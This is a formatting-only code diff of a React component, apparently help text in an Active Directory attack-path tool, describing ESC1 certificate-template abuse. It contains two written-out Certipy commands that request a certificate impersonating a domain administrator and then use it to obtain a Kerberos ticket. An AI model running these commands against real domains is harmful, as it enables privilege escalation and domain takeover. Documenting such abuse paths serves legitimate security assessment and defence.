@@ -20,26 +20,21 @@ import { Typography } from '@mui/material';
 const LinuxAbuse: FC = () => {
     return (
         <>
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
             <Typography variant='body2'>
-                An attacker may perform this attack in the following steps:
-            </Typography>
-            <Typography variant='body2'>
-                <b>Step 1</b>:  Use Certipy to request enrollment in the affected template, specifying the target
+                <b>Step 1</b>: Use Certipy to request enrollment in the affected template, specifying the target
                 enterprise CA and target principal to impersonate:
             </Typography>
             <Typography component={'pre'}>
                 {
-                    "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local"
+                    'certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local'
                 }
             </Typography>
             <Typography variant='body2'>
-                <b>Step 2</b>: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:
+                <b>Step 2</b>: Request a ticket granting ticket (TGT) from the domain, specifying the certificate
+                created in Step 1 and the IP of a domain controller:
             </Typography>
-            <Typography component={'pre'}>
-                {
-                    "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"
-                }
-            </Typography>
+            <Typography component={'pre'}>{'certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128'}</Typography>
         </>
     );
 };
